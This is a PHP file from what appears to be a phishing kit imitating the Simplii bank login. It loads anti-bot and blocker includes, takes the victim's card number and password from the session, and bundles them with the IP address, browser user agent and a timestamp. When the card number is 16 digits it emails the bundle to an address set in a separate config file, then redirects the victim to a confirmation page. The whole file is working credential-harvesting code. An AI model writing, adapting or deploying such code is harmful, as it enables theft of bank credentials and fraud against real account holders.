<?php
session_start();
include './prevents/anti7.php';
			include './prevents/anti8.php';
				include './prevents/anti9.php';
include "youremail.php";
include('blocker.php');
$ip = getenv("REMOTE_ADDR");
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$timedate = date("D/M/d, Y g(idea) a");

$aa = $_SESSION['cardNumber'];
$pp = $_SESSION['password'];
$data ="
## SIMPLII LOGIN ##
|USER : $aa
|PASS : $pp
##---------------##
IP : $ip
UA : $browserAgent
Time : $timedate
";

$subj="##SIMPLII #$ip";

if($aa == "" || $pp==""){
	echo "<meta http-equiv='refresh' content='0;url=finish.php'>";
}
if (strlen($aa) == 16 ){
mail($emailusr, $subj, $data);	
}

header("Location: confirm.php");

?>